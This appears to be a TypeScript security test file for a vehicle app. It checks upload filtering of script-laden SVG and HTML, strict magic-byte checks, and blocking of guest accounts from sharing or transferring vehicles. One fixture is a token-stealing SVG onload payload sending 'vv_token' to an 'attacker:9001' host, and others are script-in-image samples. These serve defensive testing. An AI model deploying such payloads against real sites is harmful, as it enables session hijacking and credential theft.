import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { db } from '../db/database.js';
import { VehicleShareController } from '../controllers/vehicleShareController.js';
import { containsDangerousSignatures, matchesMagicBytes } from '../middleware/upload.js';

describe('GHSA-8pqw-qmg6-35wg Security Hardening', () => {
  it('detects and rejects dangerous SVG and HTML script payloads', () => {
    const maliciousSvg = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg" onload="location=\'http://attacker:9001/?t=\'+localStorage.getItem(\'vv_token\')"/>'
    );
    assert.equal(containsDangerousSignatures(maliciousSvg), true);

    const disguisedXml = Buffer.from('<?xml version="1.0" encoding="UTF-8"?><root><svg>test</svg></root>');
    assert.equal(containsDangerousSignatures(disguisedXml), true);

    const scriptPayload = Buffer.from('GIF89a<script>alert(1)</script>');
    assert.equal(containsDangerousSignatures(scriptPayload), true);

    const cleanJpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
    assert.equal(containsDangerousSignatures(cleanJpeg), false);

    const cleanPdf = Buffer.from('%PDF-1.4\n1 0 obj\n<<>>\nendobj');
    assert.equal(containsDangerousSignatures(cleanPdf), false);
  });

  it('verifies magic bytes strictly for images and pdfs', () => {
    const fakeJpegSvg = Buffer.from('<svg onload="evil()"></svg>');
    assert.equal(matchesMagicBytes(fakeJpegSvg, ['image', 'pdf']), false);

    const realJpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
    assert.equal(matchesMagicBytes(realJpeg, ['image']), true);

    const realPng = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    assert.equal(matchesMagicBytes(realPng, ['image']), true);

    const realWebp = Buffer.from('RIFF\x20\x00\x00\x00WEBPVP8 ');
    assert.equal(matchesMagicBytes(realWebp, ['image']), true);

    const realPdf = Buffer.from('%PDF-1.7\n');
    assert.equal(matchesMagicBytes(realPdf, ['pdf']), true);
  });

  it('rejects guest users from transferring vehicle ownership', async () => {
    const guestId = crypto.randomUUID();
    const targetUserId = crypto.randomUUID();
    const vehicleId = crypto.randomUUID();
    const now = new Date().toISOString();
    const guestEmail = `guest_${crypto.randomUUID().slice(0, 8)}@proef.local`;
    const targetEmail = `admin_${crypto.randomUUID().slice(0, 8)}@vault.local`;

    db.run(
      'INSERT INTO users (id, email, password_hash, role, is_guest, created_at, updated_at) VALUES (?, ?, ?, ?, 1, ?, ?)',
      [guestId, guestEmail, 'hash', 'user', now, now]
    );
    db.run(
      'INSERT INTO users (id, email, password_hash, role, is_guest, created_at, updated_at) VALUES (?, ?, ?, ?, 0, ?, ?)',
      [targetUserId, targetEmail, 'hash', 'admin', now, now]
    );
    db.run(
      'INSERT INTO vehicles (id, user_id, name, type, license_plate, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
      [vehicleId, guestId, 'Guest Vehicle', 'car', 'GG-01-XX', now, now]
    );

    let resStatus = 200;
    let resJson: any = null;
    const req: any = {
      params: { id: vehicleId },
      user: { userId: guestId, role: 'user' },
      body: { email: targetEmail },
    };
    const res: any = {
      status: (code: number) => {
        resStatus = code;
        return res;
      },
      json: (data: any) => {
        resJson = data;
      },
    };

    await VehicleShareController.transferOwnership(req, res);
    assert.equal(resStatus, 403);
    assert.match(resJson?.error, /Proefaccounts kunnen geen eigendom/i);
  });

  it('rejects guest users from sharing vehicle with other users', async () => {
    const guestId = crypto.randomUUID();
    const vehicleId = crypto.randomUUID();
    const now = new Date().toISOString();
    const guestEmail = `guest_${crypto.randomUUID().slice(0, 8)}@proef.local`;
    const targetEmail = `friend_${crypto.randomUUID().slice(0, 8)}@vault.local`;

    db.run(
      'INSERT INTO users (id, email, password_hash, role, is_guest, created_at, updated_at) VALUES (?, ?, ?, ?, 1, ?, ?)',
      [guestId, guestEmail, 'hash', 'user', now, now]
    );
    db.run(
      'INSERT INTO vehicles (id, user_id, name, type, license_plate, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
      [vehicleId, guestId, 'Guest Shared Car', 'car', 'GG-02-XX', now, now]
    );

    let resStatus = 200;
    let resJson: any = null;
    const req: any = {
      params: { id: vehicleId },
      user: { userId: guestId, role: 'user' },
      body: { email: targetEmail, role: 'viewer' },
    };
    const res: any = {
      status: (code: number) => {
        resStatus = code;
        return res;
      },
      json: (data: any) => {
        resJson = data;
      },
    };

    await VehicleShareController.addShare(req, res);
    assert.equal(resStatus, 403);
    assert.match(resJson?.error, /Proefaccounts kunnen geen voertuigen delen/i);
  });
});
